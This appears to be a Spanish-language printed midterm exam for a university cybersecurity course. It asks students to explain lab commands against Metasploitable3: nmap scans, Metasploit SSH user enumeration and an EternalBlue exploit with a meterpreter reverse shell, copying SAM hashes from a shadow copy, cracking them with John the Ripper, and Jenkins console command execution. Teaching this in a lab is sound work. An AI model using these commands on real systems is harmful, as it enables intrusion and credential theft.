# EXAMEN PARCIAL — CIBERSEGURIDAD UNTELS 2026-I

**Curso:** PET 204 Ciberseguridad  
**Docente:** Oscar Llerena Castro  
**Modalidad:** Presencial — hoja impresa  
**Duración:** 90 minutos  
**Puntaje total:** 20 puntos (1 punto por pregunta)

---

**Apellidos y nombres:** _______________________________________________

**Fecha:** _______________  **Nota:** _________ / 20

---

> **Instrucciones:** Responda cada pregunta en el espacio asignado. Las preguntas prácticas
> presentan comandos o bloques de código y piden que explique qué hacen; las conceptuales
> requieren una explicación breve pero precisa. Está prohibido el uso de dispositivos electrónicos.

---

## UNIDAD 1 — Jekyll, Git y GitHub Pages (3 puntos)

---

**1.** ¿Cuál es el rol de GitHub Actions en el pipeline de publicación del blog Jekyll?
Describa brevemente los pasos que ocurren desde que el alumno ejecuta `git push`
hasta que el post es visible en el navegador. *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**2.** Dado el siguiente bloque de Front Matter, explique qué hace cada campo y por qué
los cuatro son obligatorios en un post de Jekyll: *(1 punto)*

```yaml
---
title: "Lab 01 - Metasploitable"
date: 2026-06-01 12:00:00 -0500
categories: [lab]
tags: [virtualbox]
---
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**3.** Explique qué hace cada uno de los siguientes comandos y en qué orden deben
ejecutarse para publicar un nuevo post en el blog: *(1 punto)*

```bash
git push
git add .
git commit -m "lab01: add Metasploitable installation post"
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

## UNIDAD 2 — Setup de Laboratorio y VirtualBox (5 puntos)

---

**4.** ¿Cuál es la diferencia principal entre los modos **NAT** y **NAT Network** en
VirtualBox? ¿Por qué el modo NAT simple no es suficiente para el laboratorio de
este curso? *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**5.** ¿Por qué el modo **Bridged Adapter** es peligroso para las prácticas de este
curso? Describa el riesgo concreto que implica usarlo en la red de la universidad. *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**6.** ¿Qué es un **snapshot** en VirtualBox? ¿Por qué es obligatorio tomarlo antes de
ejecutar cualquier Kill Chain? *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**7.** Explique qué hace cada uno de los siguientes comandos Nmap y qué información
proporciona su output: *(1 punto)*

```bash
(a) sudo nmap -sn 10.0.2.0/24

(b) sudo nmap -sV -p 22 10.0.2.15
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**8.** Al importar el `.ova` de Metasploitable3 en VirtualBox: ¿cuáles son las credenciales
del usuario administrador? ¿Qué hace el comando `slmgr.vbs /rearm` y por qué es
necesario ejecutarlo al ingresar por primera vez? *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

## UNIDAD 3 — Kill Chains, Metasploit y MITRE ATT&CK (12 puntos)

---

**9.** Diferencie los tres tipos de reconocimiento: **pasivo**, **semi-pasivo** y **activo**.
Dé un ejemplo de técnica para cada uno. *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**10.** Explique qué hace cada flag del siguiente comando y qué tipo de información
produce en su output: *(1 punto)*

```bash
sudo nmap -A -p- 10.0.2.15
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**11.** ¿Qué versión de OpenSSH corre en Metasploitable3 y en qué puerto? ¿Por qué esa
versión en su configuración por defecto es vulnerable a fuerza bruta? Mencione
**dos** medidas de seguridad ausentes. *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**12.** Describa qué hace la siguiente secuencia de Metasploit paso a paso.
¿Qué información produce como output al finalizar? *(1 punto)*

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 10.0.2.15
set USER_FILE /home/user/usernames.txt
run
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**13.** ¿Qué es el **Volume Shadow Copy Service (VSS)**? ¿Por qué se utiliza `vssown.vbs`
para acceder a los archivos SAM y SYSTEM si ya se tiene una sesión SSH activa
en el sistema? *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**14.** Explique qué hace el siguiente comando y por qué es necesario acceder a los archivos
SAM y SYSTEM desde el shadow copy en lugar de copiarlos directamente desde
`C:\Windows\System32\config\`: *(1 punto)*

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM C:\Windows\Temp\SAM
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**15.** Explique qué hace cada flag del siguiente comando de John the Ripper: *(1 punto)*

```bash
john --format=NT --wordlist=kaonashi14M.txt hashes.txt --fork=4
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**16.** ¿En qué consiste la vulnerabilidad explotada en el **Kill Chain 2 (Jenkins Script
Console)**? ¿Por qué se clasifica como riesgo **Crítico**? *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**17.** Dado el siguiente script ejecutado en la Jenkins Script Console, explique qué hace
y cuál sería el output esperado al correrlo en Metasploitable3: *(1 punto)*

```groovy
println "cmd /c whoami".execute().text
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**18.** EternalBlue (MS17-010) explota una vulnerabilidad en el protocolo **SMBv1**.
¿Qué nivel de privilegio obtiene el atacante al ejecutar exitosamente este exploit?
¿Qué implica ese nivel de acceso sobre el sistema comprometido? *(1 punto)*

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**19.** Explique qué hace cada línea de la siguiente secuencia de Metasploit y qué
resultado se obtiene al finalizar exitosamente: *(1 punto)*

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.15
set LHOST 10.0.2.9
set payload windows/x64/meterpreter/reverse_tcp
run
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

---

**20.** El framework MITRE ATT&CK organiza las acciones del adversario en **tácticas**
(el *por qué*) y **técnicas** (el *cómo*). Explique con sus propias palabras la
diferencia entre las siguientes tres tácticas y dé **un ejemplo concreto del
laboratorio** para cada una: *(1 punto)*

- **Initial Access** (Acceso Inicial):

&nbsp;

&nbsp;

- **Credential Access** (Acceso a Credenciales):

&nbsp;

&nbsp;

- **Privilege Escalation** (Escalación de Privilegios):

&nbsp;

&nbsp;

---

*Ciberseguridad UNTELS 2026-I — Examen Parcial 01*
